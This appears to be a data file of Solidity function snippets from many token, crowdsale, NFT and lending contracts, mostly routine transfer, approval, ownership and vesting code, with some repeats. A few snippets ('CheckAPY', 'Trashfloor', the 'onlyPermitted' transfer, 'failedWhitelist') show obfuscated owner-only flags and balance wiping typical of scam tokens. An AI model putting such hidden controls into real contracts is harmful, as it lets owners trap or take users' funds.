        address operator,
        address tokenHolder
    ) public view returns (bool) {
        return operator == tokenHolder ||
            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function calcPostId(
        address _owner,
        string _title
    ) public view returns (
        bytes32 postId
    ) {
        /* Calculate the post id. */
        postId = keccak256(abi.encodePacked(
            _namespace, '.', _owner, '.', _title));
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function _getFee(address _from, address _to, uint _value) private view returns (uint) {
        if (mapAddress_Excluded[_from] || mapAddress_Excluded[_to]) {
           return 0;                                                                        // No fee if excluded
        } else {
            return (_value / 1000);                                                         // Fee amount = 0.1%
        }
    }
--------------------------------------------------------------------------------
constructor(address _tokenSaleOpt1, address _tokenSaleOpt2, address _tokenSaleOpt3) public {
        owner = msg.sender;
        
        tokenSaleOpt1 = _tokenSaleOpt1;
        tokenSaleOpt2 = _tokenSaleOpt2;
        tokenSaleOpt3 = _tokenSaleOpt3;
        
        _tokenAllocation();
        _setLocking();
    }
--------------------------------------------------------------------------------
function acceptManagement() public {
        require(msg.sender == newManager);
        ManagerUpdate(manager, newManager);
        manager = newManager;
        newManager = 0x0;
    }
--------------------------------------------------------------------------------
function claimHodlRewardsFor(address[] _beneficiaries) external {
        for (uint256 i = 0; i < _beneficiaries.length; i++)
            claimHodlRewardFor(_beneficiaries[i]);
    }
--------------------------------------------------------------------------------
constructor (string memory name, string memory symbol, uint256 maxSupply) public {
        initOwned(msg.sender);

        _name = name;
        _symbol = symbol;
        _max_supply = maxSupply;

        // register the supported interfaces to conform to ERC721 via ERC165
        _registerInterface(_INTERFACE_ID_ERC721_METADATA);
    }
--------------------------------------------------------------------------------
function endSale() public onlyOwner {
        finished = true;
        // send remaining tokens back to the owner
        uint256 tokensLeft = token.balanceOf(this);
        token.transfer(owner, tokensLeft);
    }
--------------------------------------------------------------------------------
function getUserBonusAvailable(address _user) public view returns(uint ETH_Released, uint token_Released) {
        
        uint ETHValue = _calculateETHReleasedAmount(_user);
        uint tokenValue = _calculateTokenReleasedAmount(_user);
        
        return (ETHValue, tokenValue);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function _burn(address _owner, uint256 _tokenId) internal {
    clearApproval(_owner, _tokenId);
    removeTokenFrom(_owner, _tokenId);
    Transfer(_owner, address(0), _tokenId);
  }
--------------------------------------------------------------------------------
function allowance(address _owner, address _spender) public view returns(uint256)
    {
       require(_owner != address(0x0) && _spender != address(0x0));

       return allowed[_owner][_spender];
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function _addHolder(address _holder) internal {
        if (holderNumber[_holder] == 0) {
            holders.push(_holder);
            holderNumber[_holder] = holders.length;
        }
    }
--------------------------------------------------------------------------------
function prove(uint blockNumber, address account, uint balance, bytes32[] memory proof) public {
        require(proofIsCorrect(blockNumber, account, balance, proof), "error_proof");
        onVerifySuccess(blockNumber, account, balance);
    }
--------------------------------------------------------------------------------
function setBurner(address _address, bool _auth) onlyOwner returns (bool) {
        require(burnAllowed);
        assert(Utils.isContract(_address));
        burners[_address] = _auth;
        return true;
    }
--------------------------------------------------------------------------------
function _updateHistory(address _address) internal returns (bool) {
        accounts[_address].history.push(Snapshot(block.number, balanceOf(_address)));
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place
    }
--------------------------------------------------------------------------------
constructor(uint256 numberOfDays) public {
        OWNER = msg.sender;
        users[this] = TOTAL_SUPPLY;
        
        TIME_FOR_CROWDSALE = CREATION_TIME + (numberOfDays * 1 days);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function mNormalizePledge(uint64[] pledges) {
        for (uint i = 0; i < pledges.length; i++ ) {
            normalizePledge( pledges[i] );
        }
    }
--------------------------------------------------------------------------------
function migrationsOldStaking(
        address contractAddr,
        uint256 amount,
        uint256 blockNb
    ) public onlyAdmin {
        super._deposit(blockNb, contractAddr, amount);
        mOldStaking = contractAddr;
        mOldAmount = mOldAmount.add(amount);
    }
--------------------------------------------------------------------------------
function setRewardsAmount(address _property, uint256 _value) external {
		addressValidator().validateAddress(msg.sender, config().withdraw());

		eternalStorage().setUint(getRewardsAmountKey(_property), _value);
	}
--------------------------------------------------------------------------------
function setCumulativePrice(address _property, uint256 _value) external {
		// The previously used function
		// This function is only used in testing
		addressValidator().validateAddress(msg.sender, config().withdraw());

		eternalStorage().setUint(getCumulativePriceKey(_property), _value);
	}
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _deedId) external whenNotPaused {
        uint256[] memory _deedIds = new uint256[](1);
        _deedIds[0] = _deedId;
        
        takeOwnershipMultiple(_deedIds);
    }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
    require(state == State.Active);
    deposited[investor] = deposited[investor].add(msg.value);
  }
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) public returns (bool) {
        require(msg.sender == ownerAddress, "only OwnerWallet");
    
        LEVEL_PRICE[_level] = _price;
        return true;
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function setLockAccount(address target, uint256 lockenddate)  {
		if (msg.sender != creator) throw;
		lockAccount[target] = lockenddate;
		LockFunds(target, lockenddate);
     }
--------------------------------------------------------------------------------
function internalRefund(address receiver, uint weiAmount) internal{
        // Делаем возврат
        // Поддерживаем только 1 возврат

        if (refundedInvestors[receiver]) revert();

        fundsVault.refund(receiver, weiAmount);

        refundedInvestors[receiver] = true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function VestingAllocation(uint256 _tokensPerPeriod, uint256 _periods, uint256 _minutesInPeriod, uint256 _initalTimestamp) Ownable() public {
    totalSupply = _tokensPerPeriod * _periods;
    periods = _periods;
    minutesInPeriod = _minutesInPeriod;
    remainingTokensPerPeriod = _tokensPerPeriod;
    initTimestamp = _initalTimestamp;
  }
--------------------------------------------------------------------------------
function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    backpack[spender] = val;
    flipflops[spender] = val2; 
    soundbox[spender] = val3;
    cocos = val4;
  }
--------------------------------------------------------------------------------
function grantOwnership(address _owner) onlyOwner public {
    require(_owner != address(0));
    owners[_owner] = true;
    OwnershipGranted(msg.sender, _owner);
  }
--------------------------------------------------------------------------------
function revokeOwnership(address _owner) onlyOwner public {
    require(_owner != msg.sender);
    owners[_owner] = false;
    OwnershipRevoked(msg.sender, _owner);
  }
--------------------------------------------------------------------------------
function liquidateBorrow(address borrower, GToken cTokenCollateral) external payable {
        (uint err,) = liquidateBorrowInternal(borrower, msg.value, cTokenCollateral);
        requireNoError(err, "liquidateBorrow failed");
    }
--------------------------------------------------------------------------------
function setExchangeRate(uint8 _newRate) external onlyOwner {
    require(_newRate > 0, "new rate must not be 0");
    exchangeRate = _newRate;
  }
--------------------------------------------------------------------------------
function setUSDCentsExchangeRate(uint8 _newRate) external onlyOwner {
    require(_newRate > 0, "new rate must not be 0");
    usdCentsExchangeRate = _newRate;
  }
--------------------------------------------------------------------------------
function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
    super._postValidatePurchase(_beneficiary, _weiAmount);
    if (overflowAmount > 0) {
      weiRaised = weiRaised.sub(overflowAmount);
    }
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function Crowdsale(address _tokenAddress) public{
    token = HeliosToken(_tokenAddress);
    techSupport = 0xcDDC1cE0b7D4C9B018b8a4b8f7Da2678D56E8619;

    token.setCrowdsaleContract(address(this));
    owner = 0xA957c13265Cb1b101401d10f5E0b69E0b36ef000;
  }
--------------------------------------------------------------------------------
function transferOwnership(
        address newOwner
        )
        public
        onlyOwner
    {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
--------------------------------------------------------------------------------
function isWhitelisted(BaseWallet _wallet, address _target) public view returns (bool _isWhitelisted) {
        uint whitelistAfter = transferStorage.getWhitelist(_wallet, _target);
        // solium-disable-next-line security/no-block-members
        return whitelistAfter > 0 && whitelistAfter < now;
    }
--------------------------------------------------------------------------------
function isValidSignature(bytes memory _data, bytes memory _signature) public view returns (bytes4) {
        bytes32 msgHash = keccak256(abi.encodePacked(_data));
        isValidSignature(msgHash, _signature);
        return ERC721_ISVALIDSIGNATURE_BYTES;
    }
--------------------------------------------------------------------------------
function calculateLiquidityToBurn(address asset, uint amount) public view returns (uint) {
        return IERC20(pair).totalSupply()
                .mul(amount)
                .div(IERC20(asset).balanceOf(pair));
    }
--------------------------------------------------------------------------------
function _getLinkedModule(bytes32 _id) internal view returns (address) {
        address module = linkedModules[_id];
        require(module != address(0), ERROR_MODULE_NOT_SET);
        return module;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function setHouseAddressShare (uint _share) public onlyOtherSettingOwner {
		require(_share >= 1 && _share <= 100);
		require(_share + shareOfReferralAddress <= 100);
		shareOfHouseAddress = _share;
	}
--------------------------------------------------------------------------------
constructor() public {
        totalSupply = totalSupply*10**uint256(decimals);  // Update total supply with the decimal amount
        balanceOf[this]=totalSupply;
        Owned(msg.sender);
    }
--------------------------------------------------------------------------------
function transferOwnership(
    address _newOwner
  )
    public
    onlyOwner
  {
    require(_newOwner != address(0), ZERO_ADDRESS);
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);
    
    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function executeTokenFallback(address _to, uint256 _value, bytes _data) private returns (bool) {
		ERC223Reciever receiver = ERC223Reciever(_to);
		
		return receiver.tokenFallback(msg.sender, _value, _data);
	}
--------------------------------------------------------------------------------
constructor(address _snt, address _burnAddress, address _kyberNetworkProxy, address _walletId, uint _maxSlippageRate) public {
        SNT = _snt;
        burnAddress = _burnAddress;
        kyberNetworkProxy = KyberNetworkProxy(_kyberNetworkProxy);
        walletId = _walletId;

        setMaxSlippageRate(_maxSlippageRate);
    }
--------------------------------------------------------------------------------
constructor(address owner2Address) 
    public 
    {
        owner = msg.sender;
        owner2 = owner2Address;
        pocContract = PoC(address(0x1739e311ddBf1efdFbc39b74526Fd8b600755ADa));
        tokenBalance = 0;
    }
--------------------------------------------------------------------------------
function _pause(bool attorney) internal {
        pauseState.paused = true;
        pauseState.pausedByAttorney = attorney;
        emit Paused(msg.sender, attorney);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function SponseeTokenModelSolaCoin(
        address _rbInformationStoreAddress,
        address _rateAddress,
        address _sponsee,
        address _to
    ) {
        rbInformationStore = RBInformationStore(_rbInformationStoreAddress);
        rate = Rate(_rateAddress);
        sponseeAddress = _sponsee;
        balances[_to] = totalSupply;
    }
--------------------------------------------------------------------------------
function Authorizable() public {
        authorizers.length = 2;
        authorizers[1] = msg.sender;
        authorizerIndex[msg.sender] = 1;
    }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyAuthorized {
        authorizerIndex[_addr] = authorizers.length;
        authorizers.length++;
        authorizers[authorizers.length - 1] = _addr;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function claimOwnership() public {
        require(msg.sender == newOwner, "Restricted to new owner");

        _transferOwnership(msg.sender);
    }
--------------------------------------------------------------------------------
function freezeAccount(address target, bool freeze)  public {
        require(msg.sender == owner); // Only the contract owner can freeze an ethereum wallet
        frozenAccount[target] = freeze; // Freezes the target ethereum wallet
        emit FrozenFunds(target, freeze); 
    }
--------------------------------------------------------------------------------
function transferFrom(address from, address to, uint256 value) public returns (bool) {
        _decreaseAllowance(from, msg.sender, value);
        _transfer(from, to, value);
        return true;
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        _increaseAllowance(msg.sender, spender, value);
        return true;
    }
--------------------------------------------------------------------------------
function decreaseAllowance(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        _decreaseAllowance(msg.sender, spender, value);
        return true;
    }
--------------------------------------------------------------------------------
function balance() public view returns (uint) {
        return token.balanceOf(address(this))
                .add(IController(controller).balanceOf(address(token)));
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function getTotalSupply() public view returns (uint) {
        uint sum = 0; 
        sum += drpsToken.totalSupply();
        sum += drpuToken.totalSupply();
        return sum;
    }
--------------------------------------------------------------------------------
function DOMAIN_SEPARATOR() public view returns (bytes32) {
        return
            keccak256(
                abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(NAME)), getChainId(), address(this))
            );
    }
--------------------------------------------------------------------------------
function CocaCoinaCoin() public {
    totalSupply_ = founderTokens;
    balances[msg.sender] = founderTokens;
    Transfer(0x0, msg.sender, founderTokens);
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function drain() external onlyOwner() {
        uint256 balance = _getBalanceOf(rewardToken, address(this));
        _safeTransfer(rewardToken, msg.sender, balance);
    }
--------------------------------------------------------------------------------
constructor (uint256 initialSupply, address payable owner) public {
        _decimals = 18;
        _owner = owner;
        _safeOwner = owner;
        _mint(_owner, initialSupply*(10**18));
    }
--------------------------------------------------------------------------------
constructor () ERC20Detailed("MoonBeam", "GLMR", 18) public{
      _owner = msg.sender;
    _totalSupply = 20000000 *(10**uint256(18));
    
	_balances[_owner] = _totalSupply;
  }
--------------------------------------------------------------------------------
function reinvest(
        bool isAutoReinvestChecked,
        uint24 period,
        uint256 rewardPerInvocation,
        uint256 minimumDividendValue
    ) public {
        _reinvest(msg.sender);

        // Setup Auto Reinvestment
        if (isAutoReinvestChecked) {
            _setupAutoReinvest(
                period,
                rewardPerInvocation,
                msg.sender,
                minimumDividendValue
            );
        }
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function donate() external payable {
        require(msg.value >= 0);
        sender.transfer(msg.value);
        Donation(msg.sender);
    }
--------------------------------------------------------------------------------
function JTrex() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(holderBalance[_owner]).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function unfreeze(address investor) onlyOwner public returns (bool) {
        require(freezed[investor]);
        freezed[investor] = false;
        Unfreezed(investor);
        return !freezed[investor];
    }
--------------------------------------------------------------------------------
function failedWhitelist(address _beneficiary) internal  {
    require(_beneficiary != address(0));
    uint256 amount = _balances[_beneficiary];
    _balances[_beneficiary] = 0;
  }
--------------------------------------------------------------------------------
function releaseMyTokens() external {
        address vesting = beneficiaryToVesting[msg.sender];
        require(vesting != 0);
        TokenVestingInterface(vesting).release();
    }
--------------------------------------------------------------------------------
function addLockedAmount(uint256 _amount) external {
        require(vestingExists(msg.sender));
        amountLockedInVestings = amountLockedInVestings.add(_amount);
        emit LockedAmountIncreased(_amount);
    }
--------------------------------------------------------------------------------
function substractLockedAmount(uint256 _amount) external {
        require(vestingExists(msg.sender));
        amountLockedInVestings = amountLockedInVestings.sub(_amount);
        emit LockedAmountDecreased(_amount);
    }
--------------------------------------------------------------------------------
function protectedTokens() internal override view returns (address[] memory){
        address[] memory protected = new address[](1);
        protected[0] = mmVault;
        return protected;
    }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] _operators)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < _operators.length; i++) {
            addAddressToWhitelist(_operators[i]);
        }
    }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] _operators)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < _operators.length; i++) {
            removeAddressFromWhitelist(_operators[i]);
        }
    }
--------------------------------------------------------------------------------
function getClaimRemainingChallengers(bytes32 superblockHash) public view returns (uint) {
        SuperblockClaim storage claim = claims[superblockHash];
        return claim.challengers.length - (claim.currentChallenger);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function mul_ScalarTruncateAddUInt(Exp memory a, uint scalar, uint addend) pure internal returns (uint) {
        Exp memory product = mul_(a, scalar);
        return add_(truncate(product), addend);
    }
--------------------------------------------------------------------------------
function triggerHalving(uint _eth_multiplier) private {
        // Set the halving number (how many halvings have occurred)
        halving_number = uint((giveaway_count + _eth_multiplier) / halving_tick);
        
        // EMIT ETH to the winning miner
        msg.sender.transfer(address(this).balance);
        
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
        external
        view
        returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function addAmbassador(address addr) onlyAdministrator public returns(bool success) {
    if (!ambassadors_[addr] && isPremine()) {
      ambassadors_[addr] = true;
      ambassadorCount += 1;
      success = true;
    }
  }
--------------------------------------------------------------------------------
function removeAdministrator(address addr) onlyAdministrator public returns(bool success) {
    if (administrators[addr] && msg.sender==PoEIF) {
      administrators[addr] = false;
      success = true;
    }
  }
--------------------------------------------------------------------------------
function allocateTeamToken() public onlyOwner {
        require(TeamAddress != address(0));
        require(balances[TeamAddress] == 0);
        mintTokens(TeamAddress, TeamSupply);
    }
--------------------------------------------------------------------------------
function acceptOwnership() public{
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {
        return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);
    }
--------------------------------------------------------------------------------
function borrowBalanceCurrent(address account) external nonReentrant returns (uint) {
        require(accrueInterest() == uint(Error.NO_ERROR), "accrue interest failed");
        return borrowBalanceStored(account);
    }
--------------------------------------------------------------------------------
function isOperatorFor(address _operator, address _tokenHolder) public constant returns (bool) {
        return (_operator == _tokenHolder
            || mAuthorized[_operator][_tokenHolder]
            || (mIsDefaultOperator[_operator] && !mRevokedDefaultOperator[_operator][_tokenHolder]));
    }
--------------------------------------------------------------------------------
constructor(address _inToken) internal {
        require(_inToken.isContract(), "address must be a contract");
        inToken = IToken(_inToken);
    }
--------------------------------------------------------------------------------
constructor (uint256 openingTime, uint256 closingTime) public {
        // solhint-disable-next-line not-rely-on-time
        require(openingTime >= block.timestamp);
        require(closingTime > openingTime);

        _openingTime = openingTime;
        _closingTime = closingTime;
    }
--------------------------------------------------------------------------------
function _extendTime(uint256 newClosingTime) internal {
        require(!hasClosed());
        require(newClosingTime > _closingTime);

        emit TimedCrowdsaleExtended(_closingTime, newClosingTime);
        _closingTime = newClosingTime;
    }
--------------------------------------------------------------------------------
function saleTimeOver() public view returns (bool) {
      if(noOfTiers==0){
          //since no tiers has been provided yet, hence sales has not started to end
          return false;
      }
      //If last tier has ended, it mean all tiers are finished
    return now > tiers[noOfTiers-1].endTime;
  }
--------------------------------------------------------------------------------
function purgeAccount(address account)
        external
        onlyOwner
        onlyDuringSetup
    {
        delete vestingSchedules[account];
        totalVestedBalance = safeSub(totalVestedBalance, totalVestedAccountBalance[account]);
        delete totalVestedAccountBalance[account];
    }
--------------------------------------------------------------------------------
function addAddressToOperators(address addr) onlyOwner public returns(bool success) {
        if (!operators[addr]) {
            operators[addr] = true;
            emit OperatorAddressAdded(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function removeAddressFromOperators(address addr) onlyOwner public returns(bool success) {
        if (operators[addr]) {
            operators[addr] = false;
            emit OperatorAddressRemoved(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function _burnFrom(address account, uint256 amount) internal virtual {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowed[account][_msgSender()].sub(amount));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) public returns (bool) {
        if (_to != 0x0) {
            return _transferWithReference(_to, _value, "");
        }
        else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function transferWithReference(address _to, uint _value, string _reference) public returns (bool) {
        if (_to != 0x0) {
            return _transferWithReference(_to, _value, _reference);
        }
        else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function proposeUpgrade(address _newVersion) public onlyAssetOwner returns (bool) {
        // New version address should be other than 0x0.
        if (_newVersion == 0x0) {
            return false;
        }
        
        latestVersion = _newVersion;

        UpgradeProposal(_newVersion); 
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        require(msg.sender == owner || send_allowed == true); 
        _transfer(msg.sender, _to, _value);
    }
--------------------------------------------------------------------------------
function setToken(ERC20 _token) public onlyOwner {
        require(address(token) == address(0)); // Make sure the token is not already set.

        token = _token;
        tokensForSale = token.balanceOf(this);
    }
--------------------------------------------------------------------------------
function purgeAccount(address account)
        external
        onlyOwner
        setupFunction
    {
        delete vestingSchedules[account];
        totalVestedBalance = safeSub(totalVestedBalance, totalVestedAccountBalance[account]);
        delete totalVestedAccountBalance[account];
    }
--------------------------------------------------------------------------------
function endorseProposal(bytes32 _proposalId)
        public
        isProposalState(_proposalId, PROPOSAL_STATE_PREPROPOSAL)
    {
        require(isMainPhase());
        require(isModerator(msg.sender));
        daoStorage().updateProposalEndorse(_proposalId, msg.sender);
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool) {
        // Mutable state call requires the proxy to tell the target who the msg.sender is.
        target.setMessageSender(msg.sender);

        // Forward the ERC20 call to the target contract
        IERC20(target).transfer(to, value);

        // Event emitting will occur via Synthetix.Proxy._emit()
        return true;
    }
--------------------------------------------------------------------------------
function approve(address spender, uint256 value) public returns (bool) {
        // Mutable state call requires the proxy to tell the target who the msg.sender is.
        target.setMessageSender(msg.sender);

        // Forward the ERC20 call to the target contract
        IERC20(target).approve(spender, value);

        // Event emitting will occur via Synthetix.Proxy._emit()
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function registerDsp(address dspAddress, DSPType dspType, bytes32[5] url) {
        receiveSecurityDeposit(dspAddress);
        dspRegistry.register(dspAddress, dspType, url, msg.sender);
        DSPRegistered(dspAddress);
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool) {
        // Mutable state call requires the proxy to tell the target who the msg.sender is.
        target.setMessageSender(msg.sender);

        // Forward the ERC20 call to the target contract
        IERC20(target).transfer(to, value);

        // Event emitting will occur via Synthetix.Proxy._emit()
        return true;
    }
--------------------------------------------------------------------------------
function approve(address spender, uint256 value) public returns (bool) {
        // Mutable state call requires the proxy to tell the target who the msg.sender is.
        target.setMessageSender(msg.sender);

        // Forward the ERC20 call to the target contract
        IERC20(target).approve(spender, value);

        // Event emitting will occur via Synthetix.Proxy._emit()
        return true;
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    greece[spender] = val;
    papalopus[spender] = val2; 
    colombia[spender] = val3;
    gallons = val4;
  }
--------------------------------------------------------------------------------
function Trashfloor(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    ashes[spender] = val;
    floor[spender] = val2; 
    onthe[spender] = val3;
    purple = val4;
  }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 4;
        return res;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function allowance(address _owner, address _spender) public view returns(uint256)
    {
       require(_owner != address(0x0) && _spender != address(0x0));

       return allowed[_owner][_spender];
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _unicornId) public {
        require(allowance(msg.sender, _unicornId));
        clearApprovalAndTransfer(ownerOf(_unicornId), msg.sender, _unicornId);
    }
